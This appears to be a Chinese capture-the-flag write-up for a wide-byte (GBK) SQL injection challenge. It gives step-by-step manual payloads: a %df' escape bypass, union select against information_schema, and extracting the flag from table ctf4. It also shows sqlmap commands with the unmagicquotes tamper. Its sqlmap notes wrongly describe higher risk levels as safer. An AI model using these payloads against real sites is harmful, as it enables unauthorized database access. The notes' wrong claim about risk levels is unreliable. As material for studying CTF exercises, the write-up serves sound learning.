# 宽字节注入

## 题目

> ### sql injection 3
>
> http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1
>
> your sql:select id,title from news where id = '1' 
>
> Hello World!OVO 

## 解答思路

- 判断出宽字符注入点，并且证实存在注入
- 进行正常注入流程


## 解题步骤

- 手工注入

  1. 判断注入点：加单引号，“ ' ”，发现被\转义了 
  2. 使用`%df'`宽字节注入，报错了 
  3. 输入`id=1%df' and 1=1 %23` ，显示正常
  4. 输入`id=1%df' and 1=2 %23` ，未显示任何信息，说明找到了注入点，接下来进行常规注入 
  5. 判断列数：`id=1%df' order by 2 %23`，显示正常，当`%df' order by 3 %23`时，报错，确定为2列 
  6. union联合查询，`id=1%df' and 1=2 union select 1,2 %23` 
  7. 获取当前数据库，`id=1%df' and 1=2 union select 1,database() %23` 
  8. 获取数据库名，`id=1%df' and 1=2 union select 1,group_concat(table_name) from information_schema.TABLES where table_schema=0x7361652d6368696e616c6f766572 %23`，这里数据库名使用16进制
  9. 发现ctf1-4表，随便查看一个，查看ctf4表的列明，`id=1%df' and 1=2 union select 1,group_concat(column_name) from information_schema.COLUMNS where table_name=0x63746634 %23`，发现存在id，flag两列，我们直接查询flag的值
  10. 获取flag值，`id=1%df' and 1=2 union select 1,flag from ctf4 %23`，得到flag 

  PS: 需要添加`and 1=2`,将第一个返回结果置为空，才能显示出union查询的结果

- sqlmap注入

   1. 在id后添加`%df`来实现注入

      ```shell
      sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27" --search -C flag
      --level 3 --risk 1 --thread 10
      ```

      > --threads 10 //如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10--level 3 //sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5--risk 3 // 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全----search //后面跟参数 -D -T -C 搜索列（S），表（S）和或数据库名称（S） 如果你脑子够聪明，应该知道库列表名中可能会有ctf,flag等字样，结果有时候题目就是这么耿直对吧？ 

   2. 直接使用tamper

      > unmagicquotes 主要用在宽字节注入，绕过magic_quotes/addslashes 

      ```shell
      sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" --search -C flag
      --level 3 --risk 1 --thread 10 --tamper="unmagicquotes"
      ```

      

## 漏洞挖掘思路

- todo

## 自动化解析

- TODO

- 判断题目特征：`web` `php`
- 设定题目难度等级`level`为simple
- 提交相应符合要求的字符串

